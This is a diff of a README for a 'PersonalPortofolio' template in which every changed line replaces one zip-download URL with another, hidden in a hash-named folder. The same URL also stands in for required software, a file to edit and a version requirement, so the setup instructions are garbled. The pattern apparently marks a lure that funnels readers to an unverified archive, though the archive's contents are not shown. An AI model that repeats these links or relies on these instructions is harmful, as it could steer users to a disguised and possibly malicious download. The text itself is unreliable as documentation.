@@ -1,6 +1,6 @@
 # 🌟 PersonalPortofolio - Showcase Your Work Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip%20Now-%20%F0%9F%9A%80-007BFF)](https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip)
+[![Download Now](https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip%20Now-%20%F0%9F%9A%80-007BFF)](https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip)
 
 ## 📖 Description
 
@@ -14,12 +14,12 @@ Follow these simple steps to get your Personal Portfolio up and running on your 
 
 To get started, visit this page to download the latest version of PersonalPortofolio:
 
-[Download PersonalPortofolio](https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip)
+[Download PersonalPortofolio](https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip)
 
 Once on the Releases page, follow these steps:
 
 1. Find the latest release at the top of the page.
-2. Click on the link labeled "Source Code (zip)" or "Source Code (https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip)" to download the files to your computer. You can also look for pre-built files if available, as this might allow you to skip some steps.
+2. Click on the link labeled "Source Code (zip)" or "Source Code (https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip)" to download the files to your computer. You can also look for pre-built files if available, as this might allow you to skip some steps.
 3. Once the download is complete, locate the file in your downloads folder.
 
 ## ⌨️ Setup Instructions
@@ -34,7 +34,7 @@ Here is how to set up PersonalPortofolio on your machine:
    - Navigate to the folder you just unzipped.
 
 3. **Install Necessary Tools (if they are not already installed):** 
-   - You will need https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip to run PersonalPortofolio. Download and install https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip from [the official website](https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip).
+   - You will need https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip to run PersonalPortofolio. Download and install https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip from [the official website](https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip).
    - This will also include npm (Node Package Manager), which will help you install necessary packages.
 
 4. **Open a Terminal or Command Prompt:**
@@ -52,7 +52,7 @@ Here is how to set up PersonalPortofolio on your machine:
 You can personalize your portfolio with a few easy changes:
 
 1. **Edit Your Information:** 
-   - Open the `https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip` file in a text editor.
+   - Open the `https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip` file in a text editor.
    - Change the placeholder text under the About and Experience sections to fit your details.
 
 2. **Add Your Projects:**
@@ -87,7 +87,7 @@ Once you have set up and customized your portfolio, you're ready to see it in ac
 To run PersonalPortofolio, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip** Version 12 or above.
+- **https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip** Version 12 or above.
 - **Internet Connection:** Required for initial setup and dependency downloads.
 
 ## 📬 Support
@@ -98,4 +98,4 @@ If you need help or run into problems, please check the issues section on our Gi
 
 We will regularly update PersonalPortofolio with new features and improvements. Be sure to check back on the Releases page for the latest version:
 
-[Download PersonalPortofolio](https://raw.githubusercontent.com/EternalEra-AI/PersonalPortofolio/main/Mendelssohnian/PersonalPortofolio.zip)
+[Download PersonalPortofolio](https://github.com/EternalEra-AI/PersonalPortofolio/raw/refs/heads/main/static/ff1cd94f19300f497731e4dbea761c89/ec3ac/Personal-Portofolio-v3.4.zip)
